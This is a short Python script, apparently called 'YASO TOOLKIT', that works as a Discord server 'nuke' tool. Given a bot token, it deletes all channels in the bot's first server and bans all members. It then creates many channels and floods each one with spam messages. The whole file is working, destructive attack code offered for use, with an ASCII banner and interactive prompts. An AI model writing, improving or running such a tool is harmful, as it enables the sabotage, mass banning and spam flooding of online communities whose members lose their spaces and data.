# yaso_tool
import discord
from discord.ext import commands
import asyncio,os
async def nuke_engine(token,num,name,content,ban_all,delete_all,num_msg):
	intents=discord.Intents.all();bot=commands.Bot(command_prefix='!',intents=intents)
	@bot.event
	async def on_ready():
		B='yes';A=True;print('\n[!] Starting operations...');guild=bot.guilds[0]
		if delete_all==B:await asyncio.gather(*[c.delete()for c in guild.channels],return_exceptions=A)
		if ban_all==B:await asyncio.gather(*[m.ban()for m in guild.members if m!=bot.user],return_exceptions=A)
		async def create_and_spam():
			c=await guild.create_text_channel(name)
			for _ in range(num_msg):await c.send(content)
		await asyncio.gather(*[create_and_spam()for _ in range(num)],return_exceptions=A);await bot.close()
	await bot.start(token)
def main():os.system('clear');print('\n __   __    _    ____   ___  \n \\ \\ / /   / \\  / ___| / _ \\ \n  \\ V /   / _ \\ \\___ \\| | | |\n   | |   / ___ \\ ___) | |_| |\n   |_|  /_/   \\_\\____/ \\___/ \n                             \n    --- YASO TOOLKIT ---\n    ');token=input('Token: ');num=int(input('Number of channels: '));num_msg=int(input('Messages per channel: '));name=input('Channel name: ');content=input('Message content: ');del_all=input('Delete channels? (yes/no): ').lower();ban_all=input('Ban members? (yes/no): ').lower();asyncio.run(nuke_engine(token,num,name,content,ban_all,del_all,num_msg))
if __name__=='__main__':main()
